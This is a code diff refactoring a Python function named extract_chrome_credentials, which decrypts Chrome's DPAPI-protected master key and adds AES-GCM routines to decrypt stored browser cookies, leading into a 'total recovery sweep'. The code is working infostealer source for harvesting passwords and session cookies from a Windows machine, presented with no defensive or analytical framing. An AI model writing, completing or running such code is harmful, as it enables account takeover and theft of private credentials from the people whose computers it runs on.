@@ -687,37 +687,52 @@ def extract_chrome_credentials():
                 local_state = json.load(f)
             encrypted_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])[5:]
             
-            # Professional Master Key Extraction with proper fallback
+            # --- Professional Master Key Extraction ---
             try:
-                # First attempt using official win32crypt if available
-                try:
-                    from win32crypt import CryptUnprotectData
-                    master_key = CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
-                except ImportError:
-                    # Fallback to native ctypes implementation when pywin32 not present
-                    class DATA_BLOB(ctypes.Structure):
-                        _fields_ = [("cbData", ctypes.c_uint32), ("pbData", ctypes.POINTER(ctypes.c_char))]
+                from win32crypt import CryptUnprotectData
+                master_key = CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
+            except ImportError:
+                # Fallback native ctypes implementation for systems without pywin32
+                class DATA_BLOB(ctypes.Structure):
+                    _fields_ = [("cbData", ctypes.c_uint32), ("pbData", ctypes.POINTER(ctypes.c_char))]
 
-                    ctypes.windll.crypt32.CryptUnprotectData.argtypes = [
-                        ctypes.POINTER(DATA_BLOB), # pDataIn
-                        ctypes.c_void_p,           # pptrszDataDescr
-                        ctypes.c_void_p,           # pOptionalEntropy
-                        ctypes.c_void_p,           # pvReserved
-                        ctypes.c_void_p,           # pPromptStruct
-                        ctypes.c_uint32,           # dwFlags
-                        ctypes.POINTER(DATA_BLOB)  # pDataOut
-                    ]
+                ctypes.windll.crypt32.CryptUnprotectData.argtypes = [
+                    ctypes.POINTER(DATA_BLOB),
+                    ctypes.c_void_p,
+                    ctypes.c_void_p,
+                    ctypes.c_void_p,
+                    ctypes.c_void_p,
+                    ctypes.c_uint32,
+                    ctypes.POINTER(DATA_BLOB)
+                ]
 
-                    blob_in = DATA_BLOB(len(encrypted_key), ctypes.create_string_buffer(encrypted_key))
-                    blob_out = DATA_BLOB()
+                blob_in = DATA_BLOB(len(encrypted_key), ctypes.create_string_buffer(encrypted_key))
+                blob_out = DATA_BLOB()
 
-                    if ctypes.windll.crypt32.CryptUnprotectData(ctypes.byref(blob_in), 0, 0, 0, 0, 0, ctypes.byref(blob_out)):
-                        master_key = ctypes.string_at(blob_out.pbData, blob_out.cbData)
-                        ctypes.windll.kernel32.LocalFree(blob_out.pbData)
-                    else:
-                        return b"Error: DPAPI Decryption Failed."
+                if ctypes.windll.crypt32.CryptUnprotectData(ctypes.byref(blob_in), 0, 0, 0, 0, 0, ctypes.byref(blob_out)):
+                    master_key = ctypes.string_at(blob_out.pbData, blob_out.cbData)
+                    ctypes.windll.kernel32.LocalFree(blob_out.pbData)
+                else:
+                    return b"Error: DPAPI Decryption Failed."
             except Exception as e:
                 return f"Master Key Extraction Failed: {str(e)}".encode()
+
+            # --- Standardized Cookie Decryption Functions ---
+            def decrypt_payload(cipher, payload):
+                return cipher.decrypt(payload)
+
+            def generate_cipher(aes_key, iv):
+                return AES.new(aes_key, AES.MODE_GCM, iv)
+
+            def decrypt_cookie(value, mk):
+                try:
+                    iv = value[3:15]
+                    payload = value[15:]
+                    cipher = generate_cipher(mk, iv)
+                    decrypted = decrypt_payload(cipher, payload)
+                    return decrypted[:-16].decode('utf-8', errors='ignore')
+                except Exception:
+                    return ""
 
             # --- TOTAL RECOVERY SWEEP ---
             output = []
